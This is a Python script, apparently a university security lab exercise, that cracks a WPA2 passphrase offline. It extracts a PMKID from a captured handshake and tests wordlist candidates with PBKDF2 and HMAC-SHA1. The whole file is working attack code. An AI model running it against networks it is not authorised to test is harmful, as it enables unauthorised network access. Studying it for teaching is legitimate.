#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from pdb import pm
from queue import Empty
from scapy.all import *
from binascii import a2b_hex, b2a_hex
#from pbkdf2 import pbkdf2_hex
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib
from scapy.contrib.wpa_eapol import WPA_key
from scapy.layers.dot11 import *

def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def main():
    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    pmkid=rdpcap("PMKID_handshake.pcap")

    #Trouvé en explorant le pcap
    Ssid = b"Sunrise_2.4GHz_DD4B90"

    # On effectue un filtre sur l'argument packets, on créé une liste ne contenant que les packets correspondant à un beacon contenant le SSID cherché
    list_Beacon = []
    for packet in pmkid:
        if packet.haslayer(Dot11AssoReq) and packet.info == Ssid:
            list_Beacon.append(packet)

    # On sélectionne le premier élément de la liste, et on en extrait les données requises
    beacon = list_Beacon[0]

    # On récupère l'adresse MAC
    APmac = a2b_hex((beacon.addr1).replace(":", ""))

    # On effectue un filtre sur l'argument packets, on créé une list ne contenant que les packets correspondant à un 4WHS
    list_Handshakes = []
    # Valeur du key info pour le premier message du handshake
    FIRST_MESSAGE = 0x008a

    # On parcourt les paquets en cherchant le premier message d'un handshake provenant de notre AP
    for handshake in pmkid:
        # apm = a2b_hex((handshake.addr2).replace(':',''))
        if handshake.haslayer(WPA_key) and handshake.getlayer(WPA_key).key_info == FIRST_MESSAGE and a2b_hex(
                (handshake.addr2).replace(':', '')) == APmac:
            list_Handshakes.append(handshake)

    # On récupère le premier message du handshake contenant le pmkid
    message1of4 = list_Handshakes[0].getlayer(WPA_key)
    # On récupère le mac du client
    Clientmac = a2b_hex((list_Handshakes[0].addr1).replace(":", ""))
    # On récupère les 16 derniers bytes qui correspondent au pmkid
    pmkid = message1of4.wpa_key[-16:]

    pmkName = b"PMK Name"

    # Important parameters for key derivation - most of them can be obtained from the pcap file
    passPhrase  = "actuelle"
    A           = "Pairwise key expansion" #this string is used in the pseudo-random function
    # Authenticator and Supplicant Nonces
    # This is the MIC contained in the 4th frame of the 4-way handshake
    # When attacking WPA, we would compare it to our own MIC calculated using passphrases from a dictionary

    print ("\n\nValues used to derivate keys")
    print ("============================")
    print ("Passphrase: ",passPhrase,"\n")
    print ("SSID: ",Ssid,"\n")
    print ("AP Mac: ",b2a_hex(APmac),"\n")
    print ("CLient Mac: ",b2a_hex(Clientmac),"\n")
    print ("PMKID:" , b2a_hex(pmkid), "\n")
    wordlist = open('wordlist.txt', 'r')
    #On lit chaque ligne (passphrase) du fichier un à un et on en tire les clés + MIC
    for line in wordlist.readlines():
        
        #Encode passphrase read in file
        passPhrase = str.encode(line)

        #calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1,passPhrase, Ssid, 4096, 32)

        #Calculate PMKID with calculated pmk and concatenation of mac adresses and constants
        pmkid_test = hmac.new(pmk, pmkName + APmac + Clientmac, hashlib.sha1)

        #We have to take only the 16 first bytes otherwise it does not work
        if pmkid == pmkid_test.digest()[:16]:
            print("The passphrase has been found ! Passphrase : ", passPhrase)

if __name__ == "__main__":
    main()